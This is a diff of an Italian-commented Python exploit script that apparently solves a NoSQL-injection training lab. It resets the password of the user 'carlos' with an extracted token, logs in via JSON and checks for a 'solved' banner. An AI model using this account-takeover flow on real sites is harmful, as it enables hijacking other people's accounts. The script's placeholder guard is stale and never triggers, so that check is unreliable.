@@ -32,7 +32,7 @@ def print_success(msg): print(f"{GREEN}[+] {msg}{RESET}")
 def print_info(msg): print(f"{CYAN}[*] {msg}{RESET}")
 
 # --- CONFIGURAZIONE UTENTE ---
-LAB_ID = "0a66009604fb0d76819461f6009c00cd"  # <--- AGGIORNA QUI !!!
+LAB_ID = "YOUR_LAB_CODE_HERE"  
 
 # --- CONFIGURAZIONE VISUALIZER ---
 REFRESH_RATE = 0.05 
@@ -261,20 +261,49 @@ class NoSQLMatrixExploit:
             "new-password-1": NEW_PASS, "new-password-2": NEW_PASS,
             token_name: token_value
         }
+        
+        # --- DEBUG POST RESET ---
+        print("\n" + "="*40)
+        print(f"[DEBUG] Invio POST Reset a: {self.forgot_url}")
+        print(f"[DEBUG] Dati inviati:\n{data}")
+        print("="*40 + "\n")
+        
         r_reset = self.session.post(self.forgot_url, data=data)
         
+        # --- DEBUG RESPONSE RESET ---
+        print("\n" + "="*40)
+        print(f"[DEBUG] Status Code Reset: {r_reset.status_code}")
+        # Stampiamo i primi 500 caratteri per vedere se c'è un errore evidente
+        print(f"[DEBUG] Response Body (anteprima):\n{r_reset.text[:500]}") 
+        print("="*40 + "\n")
+        
         if r_reset.status_code == 200:
-            print_success("Richiesta inviata. Procedo al login di verifica...")
+            print_success("Password resettata con successo. Procedo al login...")
             
-            # 2. Login Automatico
-            login_csrf = self.get_csrf_token(self.login_url)
-            login_data = {"csrf": login_csrf, "username": "carlos", "password": NEW_PASS}
+            # --- 2. LOGIN (Modalità JSON) ---
+            # CORREZIONE: L'endpoint login in questo lab si aspetta JSON.
+            # Quando si usa JSON, spesso il token CSRF non è richiesto o è gestito diversamente.
+            # L'errore "Missing parameter csrf" appariva perché inviavi 'data=' (form) invece di 'json='.
             
-            # Facciamo il login (request seguirà automaticamente i redirect)
-            r_login = self.session.post(self.login_url, data=login_data)
+            login_data = {
+                "username": "carlos", 
+                "password": NEW_PASS
+            }
             
-            # 3. CONTROLLO XPATH SULLA RISPOSTA DEL LOGIN
-            if self.check_if_solved(r_login):
+            print_info(f"Invio Login JSON a: {self.login_url}")
+            
+            # Usiamo json=login_data invece di data=login_data
+            r_login = self.session.post(self.login_url, json=login_data)
+            
+            print(f"[DEBUG] Status Code Login: {r_login.status_code}")
+            
+            # --- 3. VERIFICA ---
+            # Navighiamo esplicitamente a my-account per verificare la sessione
+            account_url = f"{self.base_url}/my-account?id=carlos"
+            r_account = self.session.get(account_url)
+
+            # 4. CONTROLLO XPATH SULLA RISPOSTA DELLA PAGINA ACCOUNT
+            if self.check_if_solved(r_account):
                 print("\n")
                 # LAB
                 print(f"{GREEN}██╗░░░░░░█████╗░██████╗░{RESET}")
@@ -295,15 +324,17 @@ class NoSQLMatrixExploit:
                 print("\n" + f"{GREEN}{BOLD} LAB SOLVED! Accesso confermato come Carlos.{RESET}")
                 print(f" Credenziali usate: carlos : {NEW_PASS}")
             else:
-                # Se l'XPath fallisce, stampiamo un errore ma controlliamo comunque se siamo loggati
-                print_error("Login effettuato ma Banner 'Solved' NON trovato.")
-                if "carlos" in r_login.text:
-                    print_info("Nota: Sei dentro come Carlos, ma il lab non ha mostrato il banner di vittoria.")
+                # Fallback check
+                if "Your username is: carlos" in r_account.text or "My account" in r_account.text:
+                     print_success("Accesso riuscito come Carlos (Banner non rilevato, ma sei loggato!).")
+                     print(f" Credenziali usate: carlos : {NEW_PASS}")
                 else:
-                    print_error("Login fallito o token scaduto.")
+                    print_error("Login effettuato ma Banner 'Solved' NON trovato e sessione non confermata.")
+                    # Debug extra se il check finale fallisce
+                    print(f"[DEBUG] Pagina My Account content (snippet): {r_account.text[:500]}")
         else:
             print_error(f"Cambio password fallito. Status: {r_reset.status_code}")
-
+            
 if __name__ == "__main__":
     if "INSERISCI" in LAB_ID:
         print_error("Inserisci il LAB_ID!")
